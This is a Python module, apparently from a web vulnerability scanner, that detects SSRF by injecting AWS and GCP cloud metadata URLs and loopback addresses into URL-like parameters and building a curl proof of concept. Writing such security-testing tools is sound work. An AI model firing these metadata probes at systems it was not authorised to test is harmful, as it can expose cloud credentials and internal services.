"""Cloud Metadata & Internal Network SSRF Attack Module (V15).

Verifies Server-Side Request Forgery vulnerabilities:
- Cloud metadata probes: AWS IMDSv1 (169.254.169.254), GCP (metadata.google.internal), Alibaba (100.100.100.200).
- Localhost service enumeration: 127.0.0.1, [::1], 0.0.0.0.
- Safe canary callback integration.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.ssrf")

CLOUD_METADATA_PROBES = [
    ("AWS_IMDS", "http://169.254.169.254/latest/meta-data/", [r"ami-id", r"instance-id", r"security-credentials"]),
    ("GCP_METADATA", "http://metadata.google.internal/computeMetadata/v1/instance/id", [r"[0-9]+"]),
    ("LOOPBACK_HTTP", "http://127.0.0.1:80/", [r"<html", r"welcome", r"nginx", r"apache"]),
]


class SSRFAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="ssrf", cwe_id="CWE-918", default_severity="CRITICAL")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    if any(k in p.lower() for k in ("url", "dest", "redirect", "feed", "proxy", "target", "link", "fetch")):
                        opps.append(
                            AttackOpportunity(
                                target=target,
                                endpoint=u,
                                parameter=p,
                                attack_type="ssrf",
                                hypothesis=f"URL parameter '{p}' on {parsed.path} may fetch internal network or cloud metadata resources.",
                                priority=94,
                            )
                        )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"Cloud Metadata & Internal Network SSRF Audit on {opportunity.parameter}",
            attack_type="ssrf",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                "2. Dispatch AWS IMDSv1 metadata probe (169.254.169.254)",
                "3. Dispatch localhost loopback probe (127.0.0.1)",
                "4. Check for internal service response reflections",
            ],
            payloads=[p[1] for p in CLOUD_METADATA_PROBES],
            expected_evidence="Reflection of cloud instance metadata or loopback HTTP banners.",
            context={"parameter": opportunity.parameter},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="ssrf",
                target_url=endpoint,
                message="No parameter specified for SSRF testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)

        # Baseline request
        baseline_resp = await session.get(endpoint)
        baseline_body = baseline_resp.text.lower()

        for probe_name, target_url, indicators in CLOUD_METADATA_PROBES:
            t_params = dict(query_params)
            t_params[param] = [target_url]
            probe_req_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            probe_resp = await session.get(probe_req_url)
            body_text = probe_resp.text

            if probe_resp.status_code == 200 and probe_resp.content_length > 10:
                for ind in indicators:
                    if re.search(ind, body_text, re.I) and not re.search(ind, baseline_body, re.I):
                        poc_curl = f"curl -s -k '{probe_req_url}'"
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.96,
                            proof_level="P3",
                            attack_type="ssrf",
                            target_url=endpoint,
                            parameter=param,
                            baseline_status=baseline_resp.status_code,
                            exploit_status=probe_resp.status_code,
                            evidence={
                                "probe_name": probe_name,
                                "probe_url": target_url,
                                "matched_indicator": ind,
                                "response_sample": body_text[:300],
                            },
                            poc_curl=poc_curl,
                            message=f"CRITICAL: Server-Side Request Forgery (SSRF) confirmed on parameter '{param}' ({probe_name} reached).",
                            cwe_id="CWE-918",
                            severity="CRITICAL",
                        )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="ssrf",
            target_url=endpoint,
            parameter=param,
            message=f"Parameter '{param}' did not return internal service or metadata responses.",
        )
